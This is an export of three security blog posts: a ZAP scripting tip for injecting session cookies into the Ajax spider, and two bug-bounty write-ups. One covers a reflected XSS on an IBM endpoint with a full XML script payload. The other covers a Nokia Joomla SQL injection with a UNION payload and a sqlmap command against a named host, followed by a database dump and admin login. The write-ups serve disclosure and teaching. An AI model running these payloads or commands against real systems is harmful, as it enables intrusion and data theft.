[{"ref":"https://blog.knas.me/blog/zaproxy_cookies/","title":"How to set cookies for zaproxy ajax spider manually","section":"blog","tags":["security","automation","webpentesting"],"date":"2022.12.17","body":"Greetings :wave:! In this blog, we will learn how to manually insert cookies into the Ajax spider browser in Zaproxy without doing an login automation\nWhy? You cannot automate the logging process because sometimes the target uses Capatch on the login page, but you can log in and copy the cookies into Zap.\nYou can control every aspect of Zaproxy using its scripting feature\nWith Selenium\u0026rsquo;s Firefox or Chrome browser plugin, we can write a script that executes JavaScript code whenever the Selenium tab is opened in Zap\nSteps Visit your application and log in With Zap Breakpoint, inspect the request from your browser Copy the value of the Cookie header Execute this Python script and then copy the output into the Zap Javascript code $ echo \u0026#34;login=test/test; token=12345\u0026#34; | python3 cookies.py import sys from http.cookies import SimpleCookie cookie = SimpleCookie() for rawdata in sys.stdin: rawdata = rawdata.rstrip() cookie.load(rawdata) cookies = {k: v.value for k, v in cookie.items()} for k, v in cookie.items(): print(f\u0026#34;window.localStorage.setItem(\u0026#39;{k}\u0026#39;,\u0026#39;{v.value}\u0026#39;);\u0026#34;,end=\u0026#34;\u0026#34;) Replace the jsUrl value with your domain target Set the Script output in script var var ScriptVars = Java.type(\u0026#39;org.zaproxy.zap.extension.script.ScriptVars\u0026#39;); var jsUrl = \u0026#39;http://localhost:3000\u0026#39;; function browserLaunched(ssutils) { logger(\u0026#39;browserLaunched \u0026#39; + ssutils.getBrowserId()); var wd = ssutils.getWebDriver(); var url = ssutils.waitForURL(5000); if (url.startsWith(jsUrl)) { logger(\u0026#39;url: \u0026#39; + url + \u0026#39; setting token \u0026#39; + token); var script = \u0026#39;document.cookie = \\\u0026#39;token=\u0026#39; + token + \u0026#39;\\\u0026#39;;\\n\u0026#39; + \u0026#39;window.localStorage.setItem(\\\u0026#39;token\\\u0026#39;, \\\u0026#39;\u0026#39; + token + \u0026#39;\\\u0026#39;);\u0026#39;; wd.executeScript(script); } } // Logging with the script name is super helpful! function logger() { print(\u0026#39;[\u0026#39; + this[\u0026#39;zap.script.name\u0026#39;] + \u0026#39;] \u0026#39; + arguments[0]); } -- var script = \u0026#39;document.cookie = \\\u0026#39;token=\u0026#39; + token + \u0026#39;\\\u0026#39;;\\n\u0026#39; + -- \u0026#39;window.localStorage.setItem(\\\u0026#39;token\\\u0026#39;, \\\u0026#39;\u0026#39; + token + \u0026#39;\\\u0026#39;);\u0026#39;; ++ var script = \u0026#39;document.cookie = \\\u0026#39;login=test/test; token=12345\\\u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + ++ \u0026#34;window.localStorage.setItem(\u0026#39;login\u0026#39;,\u0026#39;test/test\u0026#39;);window.localStorage.setItem(\u0026#39;token\u0026#39;,\u0026#39;12345\u0026#39;);\u0026#34; \u0026#39; Real Example // This script will log a browser into Juice Shop when forced user mode is enabled. // The \u0026#39;Juice Shop Session Management.js\u0026#39; script must have been set to authenticate correctly. // Make sure to use the version of that script in this repo rather than the one included with ZAP 2.9.0 as // it has been enhanced to support this script. //Change the jsUrl var if the instance of Juice Shop you are using is not listening on http://localhost:3000 var jsUrl = \u0026#39;http://testphp.vulnweb.com/\u0026#39;; function browserLaunched(ssutils) { logger(\u0026#39;browserLaunched \u0026#39; + ssutils.getBrowserId()); var wd = ssutils.getWebDriver(); wd.get(jsUrl); var url = ssutils.waitForURL(5000); logger(url) if (url.startsWith(jsUrl)) { var script = \u0026#39;document.cookie = \\\u0026#39;login=test/test\\\u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39;window.localStorage.setItem(\\\u0026#39;login\\\u0026#39;, \\\u0026#39;\u0026#39; + \u0026#39;test/test\u0026#39;+ \u0026#39;\\\u0026#39;);\u0026#39;; wd.executeScript(script); } } // Logging with the script name is super helpful! function logger() { print(\u0026#39;[\u0026#39; + this[\u0026#39;zap.script.name\u0026#39;] + \u0026#39;] \u0026#39; + arguments[0]); } "},{"ref":"https://blog.knas.me/blog/ibm_xss/","title":" [IBM] XSS Reflected via xml files","section":"blog","tags":["bugbounty","security","webpentesting"],"date":"2020.10.26","body":"Hello World :wave: while I\u0026rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from waybackurls to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in rssurl parameter\nhttps://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no\u0026amp;rssurl=https://www-2000.ibm.com/file.xml\u0026amp;_=1596170198353 all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn\u0026rsquo;t work at all\nbut from another side, I noticed that the response Content-type is text/HTML so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this {\u0026quot;data\u0026quot;: \u0026quot;\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;\u0026quot;}\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;something:script xmlns:something=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt;alert(1)\u0026lt;/something:script\u0026gt; \u0026lt;a:script xmlns:a=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt;alert(2)\u0026lt;/a:script\u0026gt; \u0026lt;info\u0026gt; \u0026lt;name\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[\u0026lt;script\u0026gt;confirm(document.domain)\u0026lt;/script\u0026gt;]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/name\u0026gt; \u0026lt;description\u0026gt; \u0026lt;value\u0026gt;Hello\u0026lt;/value\u0026gt; \u0026lt;/description\u0026gt; \u0026lt;url\u0026gt; \u0026lt;value\u0026gt;http://google.com\u0026lt;/value\u0026gt; \u0026lt;/url\u0026gt; \u0026lt;/info\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; then upload the file to my site and pass the URL to the rssurl parameter\nthe file should be converted like this\n{ \u0026#34;html\u0026#34;: { \u0026#34;head\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;body\u0026#34;: { \u0026#34;script\u0026#34;: [ \u0026#34;alert(1)\u0026#34;, \u0026#34;alert(2)\u0026#34; ], \u0026#34;info\u0026#34;: { \u0026#34;name\u0026#34;: { \u0026#34;value\u0026#34;: { \u0026#34;__cdata\u0026#34;: \u0026#34;\u0026lt;script\u0026gt;confirm(document.domain)\u0026lt;/script\u0026gt;\u0026#34; } }, \u0026#34;description\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;Hello\u0026#34; }, \u0026#34;url\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;http://google.com\u0026#34; } } } } } and boom\nsee ya :crossed_fingers: :heart:\n"},{"ref":"https://blog.knas.me/blog/nokia_sqli/","title":"SQL Injection on Nokia subdomain","section":"blog","tags":["bugbounty","security","webpentesting"],"date":"2019.11.04","body":"Hello :wave:, I\u0026rsquo;ll share with you how I found sqli on Nokia that makes me able to login into the admin page you will not see something new here like new techniques or something, just simple steps\nafter doing subdomain enumeration I found a subdomain that\u0026rsquo;s working with Joomla, after that I ran joomscan to get the version of the cms and plugins to see if there\u0026rsquo;s any outdated version to exploit it, and joomscan gives me an old plugin called JCK Editor with version 6.4.4 and after searching with this version on exploit-DB i found SQLI injection in this version CVE-2018-17254\nTest = [HOST]/[PATH]/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu\u0026amp;view=menu\u0026amp;parent=%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa as you can see, we can get the version of the database :mag:\nthis time for my fav weapon (SQLMAP)\n$ sqlmap -u \u0026#39;https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu\u0026amp;view=menu\u0026amp;parent=\u0026#39; --level=5 --risk=3 --random-agent --technique=U -p parent --batch --current-DB --current-user you can see the current user and the name of the database :)\nAfter dumping all databases using the \u0026ndash;all option and unencrypt the password of the admin account let\u0026rsquo;s login in admin panel\nsee ya :v:\n"}]